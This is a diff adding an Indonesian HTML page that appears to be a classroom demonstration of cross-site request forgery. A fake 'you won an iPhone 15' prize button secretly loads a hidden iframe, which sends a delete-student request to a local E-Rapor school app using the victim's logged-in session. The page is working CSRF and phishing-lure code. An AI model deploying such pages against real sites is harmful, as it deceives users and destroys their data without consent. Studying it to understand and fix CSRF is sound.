@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selamat! Anda Memenangkan iPhone 15!</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #fce4ec; padding: 50px; }
+        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); max-width: 500px; margin: 0 auto; }
+        h1 { color: #d81b60; }
+        button { background: #d81b60; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        button:hover { background: #c2185b; }
+        /* Iframe ini disembunyikan agar korban tidak melihat apa yang terjadi di latar belakang */
+        #hacker_iframe { display: none; width: 0; height: 0; border: 0; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h1>🎉 SELAMAT! 🎉</h1>
+        <p>Anda terpilih sebagai pemenang undian iPhone 15 Pro Max!</p>
+        <p>Klik tombol di bawah ini untuk mengklaim hadiah Anda sebelum hangus.</p>
+        
+        <!-- Saat diklik, ini terlihat seperti klaim hadiah, padahal diam-diam mengirim serangan -->
+        <button onclick="luncurkanSerangan()">Klaim iPhone 15 Sekarang!</button>
+    </div>
+
+    <!-- Iframe Tersembunyi (Senjata Hacker) -->
+    <iframe name="hacker_iframe" id="hacker_iframe"></iframe>
+
+    <script>
+        function luncurkanSerangan() {
+            // Target URL di aplikasi E-Rapor (Menghapus Siswa ID 2)
+            // Hacker menambahkan parameter konfirmasi=ya agar langsung tereksekusi
+            var target_url = "http://localhost/erapor/hapus_santri.php?id=2&konfirmasi=ya";
+            
+            // Iframe akan dipaksa memuat URL tersebut. 
+            // Karena browser korban masih "Login" di E-Rapor, cookie/sesi korban akan ikut dikirim!
+            document.getElementById('hacker_iframe').src = target_url;
+            
+            alert("Sedang memproses hadiah... (Lihat layar aplikasi E-Rapor Anda, apakah siswa ID 2 terhapus?)");
+        }
+    </script>
+
+</body>
+</html>
